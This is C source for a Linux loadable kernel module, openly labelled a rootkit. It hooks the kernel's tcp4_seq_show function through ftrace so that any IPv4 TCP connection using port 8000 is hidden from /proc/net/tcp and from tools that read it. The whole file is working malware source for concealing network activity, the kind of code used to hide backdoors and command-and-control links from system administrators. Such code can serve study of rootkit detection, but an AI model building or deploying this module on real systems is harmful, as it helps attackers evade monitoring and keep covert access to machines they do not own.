#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/tcp.h>

#include "ftrace_helper.h"

#define PORT_TO_HIDE 8000

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Rubbx");
MODULE_DESCRIPTION("Hiding connections from specific port");
MODULE_VERSION("1.0");

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *is;
    long ret;
    int port_to_hide = htons(PORT_TO_HIDE);

    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *)v;

        if (port_to_hide == is->inet_dport || port_to_hide == is->inet_sport) {
            return 0;
        }
    }

    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}

static struct ftrace_hook hooks[] = {
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};


static int __init rootkit_init(void)
{

    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        return err;

    printk(KERN_INFO "rootkit: Loaded (port hiding) >:-)\n");

    return 0;
}

static void __exit rootkit_exit(void)
{

    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);